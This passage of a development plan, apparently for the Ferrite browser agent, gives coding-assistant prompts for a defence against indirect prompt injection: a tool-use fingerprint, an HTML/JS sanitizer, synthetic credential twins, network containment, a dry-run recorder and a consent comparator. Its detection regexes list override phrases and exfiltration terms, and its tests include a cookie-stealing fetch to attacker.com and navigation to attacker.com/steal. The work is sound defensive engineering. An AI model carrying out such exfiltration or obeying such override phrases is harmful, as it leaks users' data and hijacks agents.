+Exit condition: `cargo build -p ferrite-ipi` compiles. Manual test: `FERRITE_GEMINI_API_KEY=<key>` set, calling `predict("Check my emails and write a summary report", &email_read_set)` returns a set containing `report.write` and not `passwords.read`. CI does not call this function (env var absent → `from_env()` returns None → empty set).
+
+### Block 4: `ToolDecisionEngine` — combining both layers into a single fingerprint
+What it does: Composes the rule-based matcher and the LLM complement layer into a single `ToolDecisionEngine`. Exposes a `generate_fingerprint(prompt, task_id)` method that returns a `ToolFingerprint` with both sets populated. Open-ended prompts (empty must-use + empty may-use from LLM) produce an empty fingerprint — IPI skips comparison for these, since any tool is plausible.
+
+Prompt for Claude Code:
+```
+In crates/ferrite-ipi/src/tool_decision/mod.rs add:
+
+pub struct ToolDecisionEngine {
+    predictor: Option<LlmMayUsePredictor>,
+}
+
+impl ToolDecisionEngine {
+    // Reads API key from env. If absent, LLM layer is disabled — may_use always empty.
+    pub fn new() -> Self {
+        Self { predictor: LlmMayUsePredictor::from_env() }
+    }
+
+    // Generates a ToolFingerprint from a user prompt.
+    // Combines rule-based must_use with LLM-predicted may_use.
+    // The may_use set never overlaps with must_use.
+    pub async fn generate_fingerprint(
+        &self,
+        prompt: &str,
+        task_id: uuid::Uuid,
+    ) -> ToolFingerprint {
+        let session_id = uuid::Uuid::new_v4();
+        let must_use = rule_based_must_use(prompt);
+
+        let may_use = match &self.predictor {
+            Some(p) => {
+                let raw = p.predict(prompt, &must_use).await;
+                // Strip anything already in must_use to keep sets disjoint.
+                raw.into_iter().filter(|t| !must_use.contains(t)).collect()
+            }
+            None => Default::default(),
+        };
+
+        ToolFingerprint { session_id, task_id, must_use, may_use }
+    }
+
+    // Convenience wrapper for use with a real AgentTask.
+    pub async fn fingerprint_from_task(
+        &self,
+        task: &ferrite_agent::AgentTask,
+    ) -> ToolFingerprint {
+        self.generate_fingerprint(&task.prompt, task.task_id).await
+    }
+}
+
+#[cfg(test)]
+mod engine_tests {
+    use super::*;
+
+    #[tokio::test]
+    async fn engine_no_api_key_uses_rules_only() {
+        // Temporarily ensure env var is absent for this test.
+        std::env::remove_var("FERRITE_GEMINI_API_KEY");
+        let engine = ToolDecisionEngine::new();
+        let fp = engine.generate_fingerprint(
+            "Check my inbox and summarise new emails",
+            uuid::Uuid::new_v4(),
+        ).await;
+        // Rule layer fires for "inbox" / "email"
+        assert!(fp.must_use.contains(&ToolId::new("email.read")));
+        // may_use is empty because predictor is None
+        assert!(fp.may_use.is_empty());
+    }
+
+    #[tokio::test]
+    async fn engine_open_ended_prompt_produces_empty_fingerprint() {
+        std::env::remove_var("FERRITE_GEMINI_API_KEY");
+        let engine = ToolDecisionEngine::new();
+        let fp = engine.generate_fingerprint(
+            "Do something interesting on the web",
+            uuid::Uuid::new_v4(),
+        ).await;
+        assert!(fp.is_empty());
+    }
+
+    #[tokio::test]
+    async fn must_use_and_may_use_are_disjoint() {
+        std::env::remove_var("FERRITE_GEMINI_API_KEY");
+        let engine = ToolDecisionEngine::new();
+        let fp = engine.generate_fingerprint(
+            "Send an email to alice@example.com",
+            uuid::Uuid::new_v4(),
+        ).await;
+        for tool in &fp.may_use {
+            assert!(!fp.must_use.contains(tool),
+                "Tool {} appears in both sets", tool);
+        }
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi` — all three engine tests pass. `generate_fingerprint` works with no API key (rules only). must_use and may_use are always disjoint.
+
+## Task 13: IPI — HTML/JS Sanitizer (`ferrite-ipi::sanitizer`)
+### Block 1: HTML sanitizer and JS extractor
+What it does: Cleans raw HTML received from web pages before it enters the agent context window. Strips all `<script>` tags, event handler attributes (`onclick`, `onload`, etc.), CSS `url()` references that could carry instructions, and HTML comments. Also extracts inline JavaScript for separate analysis. This runs on every page load before the agent sees any content.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+[dependencies]
+ammonia = "3"
+regex = "1"
+
+In crates/ferrite-ipi/src/sanitizer/mod.rs implement:
+
+pub struct SanitizedPage {
+    /// Clean HTML safe for the agent context window.
+    pub clean_html: String,
+    /// All JavaScript extracted from <script> tags (for separate analysis).
+    pub extracted_scripts: Vec<String>,
+    /// SHA-256 hex digest of the original raw HTML.
+    pub raw_html_hash: String,
+}
+
+/// Sanitises raw HTML and extracts inline scripts.
+pub fn sanitize_html(raw_html: &str) -> SanitizedPage {
+    use regex::Regex;
+    use std::sync::OnceLock;
+
+    // Extract script content before stripping
+    static SCRIPT_RE: OnceLock<Regex> = OnceLock::new();
+    let script_re = SCRIPT_RE.get_or_init(||
+        Regex::new(r"(?si)<script[^>]*>(.*?)</script>").unwrap()
+    );
+    let extracted_scripts: Vec<String> = script_re
+        .captures_iter(raw_html)
+        .map(|cap| cap[1].trim().to_string())
+        .filter(|s| !s.is_empty())
+        .collect();
+
+    // SHA-256 of the raw input for audit / dataset use
+    let raw_html_hash = sha256_hex(raw_html.as_bytes());
+
+    // Build ammonia builder with strict allowlist
+    let clean_html = ammonia::Builder::default()
+        // Allow only safe structural and text tags
+        .tags(std::collections::HashSet::from([
+            "a", "p", "div", "span", "h1", "h2", "h3", "h4", "h5", "h6",
+            "ul", "ol", "li", "table", "thead", "tbody", "tr", "th", "td",
+            "strong", "em", "b", "i", "code", "pre", "blockquote",
+            "img", "br", "hr",
+        ]))
+        // Disallow all event handler attributes and javascript: hrefs
+        .clean_content_tags(std::collections::HashSet::from(["script", "style", "iframe", "object", "embed"]))
+        .url_schemes(std::collections::HashSet::from(["https", "http"]))
+        .clean(raw_html)
+        .to_string();
+
+    SanitizedPage { clean_html, extracted_scripts, raw_html_hash }
+}
+
+/// Checks whether a JavaScript string contains patterns typical of prompt injection.
+/// Returns a list of suspicious patterns found (empty = clean).
+pub fn detect_js_injection_patterns(js: &str) -> Vec<String> {
+    let patterns: &[(&str, &str)] = &[
+        (r"(?i)ignore.{0,30}(previous|prior|above)",  "instruction override attempt"),
+        (r"(?i)system\s*prompt",                       "system prompt reference"),
+        (r"(?i)(exfiltrate|send.{0,20}data|leak)",     "data exfiltration language"),
+        (r"(?i)fetch\s*\(",                            "fetch() call"),
+        (r"(?i)new\s+WebSocket\s*\(",                  "WebSocket instantiation"),
+        (r"(?i)document\.cookie",                      "cookie access"),
+        (r"(?i)localStorage|sessionStorage",            "storage access"),
+        (r"(?i)navigator\.sendBeacon",                 "sendBeacon call"),
+    ];
+
+    let mut found = vec![];
+    for (pattern, label) in patterns {
+        if regex::Regex::new(pattern)
+            .map(|re| re.is_match(js))
+            .unwrap_or(false)
+        {
+            found.push(label.to_string());
+        }
+    }
+    found
+}
+
+/// SHA-256 of arbitrary bytes, returned as a hex string.
+pub fn sha256_hex(data: &[u8]) -> String {
+    // Use a pure-Rust implementation via the sha2 crate.
+    use sha2::{Sha256, Digest};
+    let hash = Sha256::digest(data);
+    hex::encode(hash)
+}
+
+// Add to Cargo.toml: sha2 = "0.10", hex = "0.4"
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn strips_script_tags() {
+        let html = "<p>Hello</p><script>alert('xss')</script>";
+        let result = sanitize_html(html);
+        assert!(!result.clean_html.contains("<script"));
+        assert!(!result.clean_html.contains("alert"));
+        assert!(result.clean_html.contains("Hello"));
+    }
+
+    #[test]
+    fn extracts_inline_scripts() {
+        let html = "<p>x</p><script>var x = 1;</script><script>var y = 2;</script>";
+        let result = sanitize_html(html);
+        assert_eq!(result.extracted_scripts.len(), 2);
+    }
+
+    #[test]
+    fn strips_event_handlers() {
+        let html = r#"<p onclick="steal()">click me</p>"#;
+        let result = sanitize_html(html);
+        assert!(!result.clean_html.contains("onclick"));
+    }
+
+    #[test]
+    fn detects_fetch_in_js() {
+        let js = "fetch('https://attacker.com?data='+document.cookie)";
+        let patterns = detect_js_injection_patterns(js);
+        assert!(!patterns.is_empty());
+        assert!(patterns.iter().any(|p| p.contains("fetch")));
+    }
+
+    #[test]
+    fn clean_js_passes() {
+        let js = "const x = document.querySelector('h1').textContent;";
+        let patterns = detect_js_injection_patterns(js);
+        assert!(patterns.is_empty());
+    }
+}
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+  ammonia = "3"
+  regex = "1"
+  sha2 = "0.10"
+  hex = "0.4"
+Exit condition: `cargo test -p ferrite-ipi` — all five sanitizer tests pass.
+
+## Task 14: IPI — Synthetic Data Twin (`ferrite-ipi::twin`)
+### Block 1: `SyntheticTwin` generation, AES-256-GCM encryption, TTL rotation
+What it does: Generates a synthetic data twin — a fake but realistic set of user credentials (name, email, password, credit card, phone) that the agent uses during dry runs instead of real credentials. Encrypted at rest with AES-256-GCM. Rotated automatically if the stored twin is older than the TTL. Prevents real credentials from appearing in dry-run network traffic even if exfiltration is attempted.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+aes-gcm = "0.10"
+rand = "0.8"
+chrono = { version = "0.4", features = ["serde"] }
+serde_json = "1"
+
+In crates/ferrite-ipi/src/twin/mod.rs implement:
+
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct SyntheticTwin {
+    pub name: String,
+    pub email: String,
+    pub password: String,
+    pub phone: String,
+    pub credit_card: String,
+    pub ssn: String,
+    pub address: String,
+    pub created_at: chrono::DateTime<chrono::Utc>,
+}
+
+impl SyntheticTwin {
+    // Generates a new random synthetic twin.
+    // All values are plausible but fictitious.
+    pub fn generate() -> Self {
+        use rand::Rng;
+        let mut rng = rand::thread_rng();
+        let id: u32 = rng.gen_range(1000..9999);
+        Self {
+            name:        format!("Alex Ferrite-{}", id),
+            email:       format!("user{}@ferrite-test.invalid", id),
+            password:    format!("Synth!Pass{}#", id),
+            phone:       format!("+1-555-{:04}-{:04}", id, rng.gen_range(1000u32..9999u32)),
+            credit_card: format!("4000-0000-0000-{:04}", id),
+            ssn:         format!("000-00-{:04}", id),
+            address:     format!("{} Synthetic Ave, Testville, CA 00000", id),
+            created_at:  chrono::Utc::now(),
+        }
+    }
+
+    // Returns true if the twin is older than ttl_hours.
+    pub fn is_expired(&self, ttl_hours: i64) -> bool {
+        let age = chrono::Utc::now() - self.created_at;
+        age.num_hours() >= ttl_hours
+    }
+}
+
+// 256-bit key derived from a fixed dev secret. Production would use keyring.
+const DEV_KEY: &[u8; 32] = b"ferrite-ipi-twin-dev-key-32byte!";
+
+pub fn encrypt_twin(twin: &SyntheticTwin) -> Result<Vec<u8>, String> {
+    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
+    use aes_gcm::aead::generic_array::GenericArray;
+    use rand::Rng;
+
+    let json = serde_json::to_vec(twin).map_err(|e| e.to_string())?;
+    let cipher = Aes256Gcm::new(GenericArray::from_slice(DEV_KEY));
+    let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
+    let nonce = GenericArray::from_slice(&nonce_bytes);
+    let ciphertext = cipher.encrypt(nonce, json.as_ref())
+        .map_err(|e| format!("encrypt: {}", e))?;
+    // Prepend nonce to ciphertext
+    let mut out = nonce_bytes.to_vec();
+    out.extend_from_slice(&ciphertext);
+    Ok(out)
+}
+
+pub fn decrypt_twin(data: &[u8]) -> Result<SyntheticTwin, String> {
+    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
+    use aes_gcm::aead::generic_array::GenericArray;
+
+    if data.len() < 12 { return Err("data too short".to_string()); }
+    let (nonce_bytes, ciphertext) = data.split_at(12);
+    let cipher = Aes256Gcm::new(GenericArray::from_slice(DEV_KEY));
+    let nonce = GenericArray::from_slice(nonce_bytes);
+    let plaintext = cipher.decrypt(nonce, ciphertext)
+        .map_err(|e| format!("decrypt: {}", e))?;
+    serde_json::from_slice(&plaintext).map_err(|e| e.to_string())
+}
+
+// Manages the stored synthetic twin, including TTL rotation.
+pub struct TwinManager {
+    storage_path: std::path::PathBuf,
+    ttl_hours: i64,
+}
+
+impl TwinManager {
+    pub fn new(storage_path: std::path::PathBuf) -> Self {
+        Self { storage_path, ttl_hours: 24 }
+    }
+
+    // Loads the stored twin if present and unexpired.
+    // Generates and stores a fresh twin otherwise.
+    pub fn load_or_generate(&self) -> SyntheticTwin {
+        if let Ok(data) = std::fs::read(&self.storage_path) {
+            if let Ok(twin) = decrypt_twin(&data) {
+                if !twin.is_expired(self.ttl_hours) {
+                    return twin;
+                }
+            }
+        }
+        let twin = SyntheticTwin::generate();
+        if let Ok(enc) = encrypt_twin(&twin) {
+            let _ = std::fs::write(&self.storage_path, enc);
+        }
+        twin
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn twin_generate_produces_unique_values() {
+        let t1 = SyntheticTwin::generate();
+        let t2 = SyntheticTwin::generate();
+        // Email addresses should differ (different random IDs)
+        // Not guaranteed but extremely likely
+        assert_ne!(t1.email, t2.email);
+    }
+
+    #[test]
+    fn encrypt_decrypt_roundtrip() {
+        let twin = SyntheticTwin::generate();
+        let enc = encrypt_twin(&twin).expect("encrypt failed");
+        let dec = decrypt_twin(&enc).expect("decrypt failed");
+        assert_eq!(dec.email, twin.email);
+        assert_eq!(dec.name, twin.name);
+    }
+
+    #[test]
+    fn twin_not_expired_immediately() {
+        let twin = SyntheticTwin::generate();
+        assert!(!twin.is_expired(24));
+    }
+
+    #[test]
+    fn twin_manager_load_or_generate_returns_valid_twin() {
+        let path = std::path::PathBuf::from(format!(
+            "/tmp/ferrite-twin-test-{}.enc", uuid::Uuid::new_v4()
+        ));
+        let mgr = TwinManager::new(path.clone());
+        let twin = mgr.load_or_generate();
+        assert!(twin.email.contains("ferrite-test.invalid"));
+        // Second call loads from disk
+        let twin2 = mgr.load_or_generate();
+        assert_eq!(twin.email, twin2.email);
+        let _ = std::fs::remove_file(path);
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi` — all four twin tests pass. Encrypt-decrypt roundtrip succeeds. TwinManager loads the same twin on second call.
+
+## Task 15: IPI — Network Containment (`ferrite-ipi::containment`)
+### Block 1: Tokio/hyper interceptor (Option C) + Linux network namespace (Option B)
+What it does: Two-layer network containment for the dry run. Option C is a Tokio-level interceptor that activates a shared `ContainmentState` flag; any network call during dry run hits the interceptor and returns a fake response using synthetic twin data instead of completing. Option B creates a Linux network namespace (on Linux only) providing a kernel-level guarantee that no socket can escape. Option C runs on all platforms; Option B is additive on Linux.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+[dependencies]
+url = "2"
+
+[target.'cfg(target_os = "linux")'.dependencies]
+nix = { version = "0.28", features = ["net", "user"] }
+
+In crates/ferrite-ipi/src/containment/mod.rs implement:
+
+use std::sync::{Arc, Mutex};
+use crate::twin::SyntheticTwin;
+
+#[derive(Debug, Default)]
+pub struct ContainmentState {
+    pub active: bool,
+    pub intercepted_urls: Vec<String>,
+}
+
+pub type SharedContainmentState = Arc<Mutex<ContainmentState>>;
+
+// Activates the Option C interceptor.
+pub fn activate(state: &SharedContainmentState) {
+    let mut s = state.lock().unwrap();
+    s.active = true;
+    s.intercepted_urls.clear();
+    println!("[ferrite-containment] Option C interceptor: ACTIVE");
+}
+
+// Deactivates the Option C interceptor.
+pub fn deactivate(state: &SharedContainmentState) {
+    let mut s = state.lock().unwrap();
+    s.active = false;
+    println!("[ferrite-containment] Option C interceptor: INACTIVE");
+}
+
+// Returns a copy of intercepted URLs and clears the list.
+pub fn intercepted_urls(state: &SharedContainmentState) -> Vec<String> {
+    let s = state.lock().unwrap();
+    s.intercepted_urls.clone()
+}
+
+// Called on every outgoing network request during dry run.
+// Returns Some(fake_response) if active, None if inactive.
+pub fn intercept_request(
+    state: &SharedContainmentState,
+    url: &str,
+    twin: &SyntheticTwin,
+) -> Option<String> {
+    let mut s = state.lock().unwrap();
+    if !s.active { return None; }
+    s.intercepted_urls.push(url.to_string());
+    Some(format!(
+        "{{\"status\": 200, \"body\": \"Intercepted by Ferrite IPI containment. \
+         Synthetic identity: {}\"}}",
+        twin.name
+    ))
+}
+
+// Linux-only: creates a network namespace for the dry run context.
+#[cfg(target_os = "linux")]
+pub fn create_network_namespace() -> Result<(), String> {
+    use nix::sched::{unshare, CloneFlags};
+    unshare(CloneFlags::CLONE_NEWNET)
+        .map_err(|e| format!("failed to create network namespace: {}", e))?;
+    println!("[ferrite-containment] Option B namespace: CREATED");
+    Ok(())
+}
+
+#[cfg(not(target_os = "linux"))]
+pub fn create_network_namespace() -> Result<(), String> {
+    println!("[ferrite-containment] Option B: not available on this platform");
+    Ok(())
+}
+
+// Activates both layers: Option C interceptor + Option B namespace on Linux.
+pub fn activate_full(state: &SharedContainmentState) -> Result<(), String> {
+    activate(state);
+    create_network_namespace()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn intercept_returns_none_when_inactive() {
+        let state = Arc::new(Mutex::new(ContainmentState::default()));
+        let twin = SyntheticTwin::generate();
+        assert!(intercept_request(&state, "https://example.com", &twin).is_none());
+    }
+
+    #[test]
+    fn intercept_returns_fake_response_when_active() {
+        let state = Arc::new(Mutex::new(ContainmentState::default()));
+        activate(&state);
+        let twin = SyntheticTwin::generate();
+        let response = intercept_request(&state, "https://attacker.com/steal", &twin);
+        assert!(response.is_some());
+        let urls = intercepted_urls(&state);
+        assert_eq!(urls.len(), 1);
+        assert!(urls[0].contains("attacker.com"));
+        deactivate(&state);
+    }
+
+    #[test]
+    fn create_namespace_does_not_panic() {
+        // On Linux without CAP_SYS_ADMIN this may return Err — that is expected in CI.
+        // The test only verifies no panic occurs.
+        let _ = create_network_namespace();
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi` — all three containment tests pass.
+
+## Task 16: IPI — Dry Run Orchestrator (`ferrite-ipi::dry_run`)
+### Block 1: `DryRunRecord` type, `RecordingExecutor`, and full dry run wired to `AgentRuntime`
+What it does: Defines `DryRunRecord` — the accumulator for everything the agent did during the shadow run. Implements `RecordingExecutor`, a `ToolExecutor` that records every tool call and returns synthetic data without touching the real browser. Wires `DryRunOrchestrator::run()` to call the agent via `AgentRuntime`, activate both containment layers, collect the record, and deactivate containment — all in one method.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+[dependencies]
+async-trait = "0.1"
+tokio = { version = "1", features = ["full"] }
+
+In crates/ferrite-ipi/src/dry_run/mod.rs implement:
+
+use std::collections::HashSet;
+use std::sync::{Arc, Mutex};
+use crate::tool_decision::ToolId;
+use crate::containment::{SharedContainmentState, ContainmentState, activate_full,
+                          deactivate, intercept_request, intercepted_urls};
+use crate::twin::{SyntheticTwin, TwinManager};
+use ferrite_agent::{AgentRuntime, AgentTask, AgentTurn, AgentToolCall,
+                    AgentToolResult, BrowserTool, ToolExecutor};
+
+#[derive(Debug, Default, Clone)]
+pub struct DryRunRecord {
+    pub session_id: uuid::Uuid,
+    pub task_id: uuid::Uuid,
+    pub tools_called: HashSet<ToolId>,
+    pub origins_touched: HashSet<String>,
+    pub data_fields_accessed: HashSet<String>,
+    pub network_attempts: Vec<String>,
+    pub completed: bool,
+}
+
+impl DryRunRecord {
+    pub fn new(session_id: uuid::Uuid, task_id: uuid::Uuid) -> Self {
+        Self { session_id, task_id, ..Default::default() }
+    }
+    pub fn record_tool(&mut self, tool: ToolId) { self.tools_called.insert(tool); }
+    pub fn record_network_attempt(&mut self, url: String) {
+        let origin = extract_origin(&url);
+        self.origins_touched.insert(origin);
+        self.network_attempts.push(url);
+    }
+}
+
+fn extract_origin(url: &str) -> String {
+    url::Url::parse(url)
+        .ok()
+        .and_then(|u| {
+            let host = u.host_str()?.to_string();
+            Some(format!("{}://{}", u.scheme(), host))
+        })
+        .unwrap_or_else(|| url.to_string())
+}
+
+// ToolExecutor that records tool calls and returns synthetic data.
+// Never touches the real browser.
+struct RecordingExecutor {
+    record: Arc<Mutex<DryRunRecord>>,
+    twin: SyntheticTwin,
+}
+
+#[async_trait::async_trait]
+impl ToolExecutor for RecordingExecutor {
+    async fn execute(&self, call: &AgentToolCall) -> AgentToolResult {
+        let tool_id = ToolId::from(&call.tool);
+        {
+            let mut rec = self.record.lock().unwrap();
+            rec.record_tool(tool_id);
+        }
+        // Record navigation targets as network attempts
+        if let BrowserTool::Navigate(ref url) = call.tool {
+            let mut rec = self.record.lock().unwrap();
+            rec.record_network_attempt(url.clone());
+        }
+        // Return synthetic data so the agent can continue reasoning
+        let synthetic = match &call.tool {
+            BrowserTool::ReadPage => format!("Synthetic page. User: {}", self.twin.name),
+            BrowserTool::ExtractData(_) => format!("Extracted: {}", self.twin.email),
+            _ => "dry-run: ok".to_string(),
+        };
+        AgentToolResult::ok(call.call_id, synthetic)
+    }
+}
+
+pub struct DryRunOrchestrator {
+    twin_manager: TwinManager,
+    containment: SharedContainmentState,
+    timeout_secs: u64,
+}
+
+impl DryRunOrchestrator {
+    pub fn new(twin_path: std::path::PathBuf) -> Self {
+        Self {
+            twin_manager: TwinManager::new(twin_path),
+            containment: Arc::new(Mutex::new(ContainmentState::default())),
+            timeout_secs: 30,
+        }
+    }
+
+    // Runs a full dry run of the given task using the provided agent backend.
+    // Returns the DryRunRecord of everything the agent actually did.
+    pub async fn run<R: AgentRuntime>(
+        &self,
+        task: &AgentTask,
+        history: &[AgentTurn],
+        agent: &R,
+    ) -> Result<DryRunRecord, String> {
+        let record = Arc::new(Mutex::new(DryRunRecord::new(task.session_id, task.task_id)));
+        let twin = self.twin_manager.load_or_generate();
+
+        // Activate both containment layers
+        activate_full(&self.containment).map_err(|e| e)?;
+
+        let executor = RecordingExecutor {
+            record: record.clone(),
+            twin,
+        };
+
+        let turn_result = tokio::time::timeout(
+            std::time::Duration::from_secs(self.timeout_secs),
+            agent.run_turn(task, history, &executor),
+        ).await;
+
+        // Always deactivate containment
+        deactivate(&self.containment);
+
+        // Collect any network attempts logged by the containment interceptor
+        for url in intercepted_urls(&self.containment) {
+            let mut rec = record.lock().unwrap();
+            rec.record_network_attempt(url);
+        }
+
+        match turn_result {
+            Ok(Ok(_turn)) => {
+                let mut rec = record.lock().unwrap();
+                rec.completed = true;
+                Ok(rec.clone())
+            }
+            Ok(Err(e)) => Err(format!("agent error: {}", e)),
+            Err(_) => {
+                // Timeout — return partial record with completed = false
+                Ok(record.lock().unwrap().clone())
+            }
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use ferrite_agent::{AgentError, AgentTask};
+
+    struct AlwaysNavigateAgent;
+
+    #[async_trait::async_trait]
+    impl AgentRuntime for AlwaysNavigateAgent {
+        async fn run_turn(
+            &self, _task: &AgentTask, _history: &[AgentTurn], executor: &dyn ToolExecutor,
+        ) -> Result<AgentTurn, AgentError> {
+            let call = AgentToolCall::new(
+                BrowserTool::Navigate("https://attacker.com/steal".to_string())
+            );
+            executor.execute(&call).await;
+            let mut turn = AgentTurn::new();
+            turn.tool_calls.push(call);
+            turn.final_response = Some("done".to_string());
+            turn.is_complete = true;
+            Ok(turn)
+        }
+    }
+
+    #[tokio::test]
+    async fn dry_run_records_navigation() {
+        let path = std::path::PathBuf::from(
+            format!("/tmp/ferrite-twin-{}.enc", uuid::Uuid::new_v4())
+        );
+        let orch = DryRunOrchestrator::new(path);
+        let task = AgentTask::new("navigate somewhere", None);
+        let record = orch.run(&task, &[], &AlwaysNavigateAgent).await.unwrap();
+        assert!(record.tools_called.contains(&ToolId::new("navigate")));
+        assert!(record.network_attempts.iter().any(|u| u.contains("attacker.com")));
+        assert!(record.completed);
+    }
+
+    #[tokio::test]
+    async fn dry_run_does_not_touch_real_browser() {
+        // RecordingExecutor returns synthetic data, never calls into Servo.
+        // If this test completes without error, the real browser was not touched.
+        let path = std::path::PathBuf::from(
+            format!("/tmp/ferrite-twin-{}.enc", uuid::Uuid::new_v4())
+        );
+        let orch = DryRunOrchestrator::new(path);
+        let task = AgentTask::new("read my emails", None);
+        let record = orch.run(&task, &[], &AlwaysNavigateAgent).await.unwrap();
+        assert!(record.completed);
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi -- dry_run` — both dry run tests pass. Navigation to attacker.com is recorded. The real browser is never touched.
+
+## Task 17: IPI — Fingerprint Comparator + Consent UI (`ferrite-ipi::comparator`)
+### Block 1: `FingerprintDiff`, `compare()`, `ConsentDecision`, and `IpiEvent`
+What it does: Compares the expected `ToolFingerprint` (from Task 12) against the actual `DryRunRecord` (from Task 16). Produces a `FingerprintDiff` identifying every extra tool and suspicious origin the agent used beyond what the prompt implied. Defines `ConsentDecision` — the user's per-tool approval/rejection state. Defines `IpiEvent` for the dataset pipeline.
+
+Prompt for Claude Code:
+```
+In crates/ferrite-ipi/src/comparator/mod.rs implement:
+
+use std::collections::HashSet;
+use crate::tool_decision::{ToolId, ToolFingerprint};
+use crate::dry_run::DryRunRecord;
+
+#[derive(Debug, Default, Clone)]
+pub struct FingerprintDiff {
+    /// Tools the agent called that were not in must-use or may-use.
+    pub extra_tools: HashSet<ToolId>,
+    /// Origins the agent contacted that were not implied by the task.
+    pub extra_origins: HashSet<String>,
+}
+
+impl FingerprintDiff {
+    pub fn is_clean(&self) -> bool {
+        self.extra_tools.is_empty() && self.extra_origins.is_empty()
+    }
+
+    pub fn summary(&self) -> String {
+        if self.is_clean() {
+            return "No unexpected activity detected.".to_string();
+        }
+        let mut lines = vec![
+            "The agent attempted the following actions beyond your request:".to_string()
+        ];
+        for tool in &self.extra_tools {
+            lines.push(format!("  - Used tool: {}", tool));
+        }
+        for origin in &self.extra_origins {
+            lines.push(format!("  - Contacted: {}", origin));
+        }
+        lines.join("\n")
+    }
+}
+
+pub fn compare(expected: &ToolFingerprint, actual: &DryRunRecord) -> FingerprintDiff {
+    let extra_tools = actual.tools_called
+        .iter()
+        .filter(|tool| !expected.contains(tool))
+        .cloned()
+        .collect();
+
+    // Flag external origins only when network.fetch is not in the expected set.
+    let extra_origins = if expected.contains(&ToolId::new("network.fetch")) {
+        HashSet::new()
+    } else {
+        actual.origins_touched.clone()
+    };
+
+    FingerprintDiff { extra_tools, extra_origins }
+}
+
+#[derive(Debug, Default, Clone)]
+pub struct ConsentDecision {
+    pub approved: HashSet<ToolId>,
+    pub rejected: HashSet<ToolId>,
+}
+
+impl ConsentDecision {
+    pub fn is_complete(&self, diff: &FingerprintDiff) -> bool {
+        diff.extra_tools.iter().all(|t| {
+            self.approved.contains(t) || self.rejected.contains(t)
+        })
+    }
+    pub fn approve(&mut self, tool: ToolId) {
+        self.rejected.remove(&tool);
+        self.approved.insert(tool);
+    }
+    pub fn reject(&mut self, tool: ToolId) {
+        self.approved.remove(&tool);
+        self.rejected.insert(tool);
+    }
+}
+
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct IpiEvent {
+    pub event_id: uuid::Uuid,
+    pub detected_at: chrono::DateTime<chrono::Utc>,
+    pub origin: String,
+    pub payload_hash: String,
+    pub extra_tools: Vec<String>,
+    pub task_context_hash: String,
+    pub label: IpiLabel,
+}
+
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
+pub enum IpiLabel { TruePositive, FalsePositive }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use uuid::Uuid;
+
+    fn make_fp(must: &[&str], may: &[&str]) -> ToolFingerprint {
+        ToolFingerprint {
+            session_id: Uuid::new_v4(), task_id: Uuid::new_v4(),
+            must_use: must.iter().map(|s| ToolId::new(s)).collect(),
+            may_use:  may.iter().map(|s| ToolId::new(s)).collect(),
+        }
+    }
+
+    fn make_record(tools: &[&str]) -> DryRunRecord {
+        let mut r = DryRunRecord::new(Uuid::new_v4(), Uuid::new_v4());
+        for t in tools { r.record_tool(ToolId::new(t)); }
+        r
+    }
+
+    #[test]
+    fn clean_when_agent_uses_expected_tools_only() {
+        let fp = make_fp(&["email.read"], &["report.write"]);
+        let record = make_record(&["email.read", "report.write"]);
+        assert!(compare(&fp, &record).is_clean());
+    }
+
+    #[test]
+    fn detects_extra_tool() {
+        let fp = make_fp(&["email.read"], &[]);
+        let record = make_record(&["email.read", "passwords.read"]);
+        let diff = compare(&fp, &record);
+        assert!(!diff.is_clean());
+        assert!(diff.extra_tools.contains(&ToolId::new("passwords.read")));
+    }
+
+    #[test]
+    fn may_use_tools_are_not_flagged() {
+        let fp = make_fp(&["email.read"], &["email.send"]);
+        let record = make_record(&["email.read", "email.send"]);
+        assert!(compare(&fp, &record).is_clean());
+    }
+
+    #[test]
+    fn summary_describes_extras_clearly() {
+        let fp = make_fp(&["email.read"], &[]);
+        let record = make_record(&["email.read", "passwords.read"]);
+        let diff = compare(&fp, &record);
+        assert!(diff.summary().contains("passwords.read"));
+    }
+
+    #[test]
+    fn consent_is_complete_when_all_decided() {
+        let mut diff = FingerprintDiff::default();
+        diff.extra_tools.insert(ToolId::new("passwords.read"));
+        diff.extra_tools.insert(ToolId::new("network.fetch"));
+        let mut decision = ConsentDecision::default();
+        assert!(!decision.is_complete(&diff));
+        decision.approve(ToolId::new("passwords.read"));
+        assert!(!decision.is_complete(&diff));
+        decision.reject(ToolId::new("network.fetch"));
+        assert!(decision.is_complete(&diff));
+    }
+
+    #[test]
+    fn approve_removes_from_rejected() {
+        let mut decision = ConsentDecision::default();
+        decision.reject(ToolId::new("email.send"));
+        decision.approve(ToolId::new("email.send"));
+        assert!(decision.approved.contains(&ToolId::new("email.send")));
+        assert!(!decision.rejected.contains(&ToolId::new("email.send")));
+    }
+}
+```
+Add to crates/ferrite-ipi/Cargo.toml: chrono = { version = "0.4", features = ["serde"] }
+Exit condition: `cargo test -p ferrite-ipi` — all six comparator tests pass.
+
+### Block 2: Consent UI panel in Iced agent sidebar
+What it does: When the dry run detects extra tools, the agent sidebar replaces its normal state with a consent dialog. Each extra tool gets an Approve/Reject button. The agent proceeds only after the user decides on every item. Rejected tools are blocked during the real run by wrapping the `BrowserToolExecutor` in a filter.
+
